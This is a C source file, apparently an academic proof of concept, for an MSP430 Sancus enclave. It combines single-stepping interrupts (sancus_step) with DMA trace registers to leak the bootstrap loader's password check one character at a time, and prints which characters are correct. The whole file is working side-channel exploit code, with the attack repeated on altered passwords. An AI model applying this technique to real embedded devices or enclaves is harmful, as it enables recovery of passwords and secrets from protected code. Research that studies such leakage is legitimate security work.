#include <stdio.h>
#include <stdint.h>
#include "sancus_support/sm_io.h"
#include "sancus_support/sancus_step.h"

#include "nemdef.h"
#include "bsl.h"

#define DMA_ADDR (*((uint16_t*) 0x0070))
#define DMA_CNT (*((uint16_t*) 0x0072))
#define DMA_TRACE (*((uint16_t*) 0x0074))
#define DMA_OFFSET (*((uint16_t*) 0x0076))

asm(".section __interrupt_vector_10,\"ax\",@progbits \n\t"
    ".word timerA_isr_entry2                         \n\t");

void attack(void)
{
  __ss_print_latency();
}

void parse_dma(void)
{
  for (volatile int i = 0; i < 2048; ++i) {} // make sure we wait for the measurement

  char result[17] = "0000000000000000";

  uint16_t offset = 108;
  for (int i = 0; i < 16; ++i) {
    DMA_OFFSET = offset;
    uint16_t trace = DMA_TRACE;
    if (trace & 0x1) {
      result[i] = 'C';
    } else {
      result[i] = '.';
    }
    offset += 61;
  }
  printf("The correct characters are: %s\n", result);
}

int main(void)
{
  char password[BSL_PASSWORD_LENGTH] = "0123456789ABCDEF";

  msp430_io_init();

#ifdef SANCUS_STEP_ENABLED
  __ss_init();
#endif

  sancus_enable(&bsl);

  DMA_ADDR = 0xdead;
  DMA_CNT = 4184;

  ATTACK(BSL430_unlock_BSL, password);

  parse_dma();

  password[2] = 'X';
  DMA_CNT = 4186;

  ATTACK(BSL430_unlock_BSL, password);

  parse_dma();

  password[7] = 'X';
  password[8] = 'X';
  DMA_CNT = 4186;

  ATTACK(BSL430_unlock_BSL, password);

  parse_dma();

  password[10] = 'X';
  password[11] = 'X';
  DMA_CNT = 4186;

  ATTACK(BSL430_unlock_BSL, password);

  parse_dma();

  EXIT();

  return 0;
}

SANCUS_STEP_ISR_ENTRY2(attack, __ss_end);
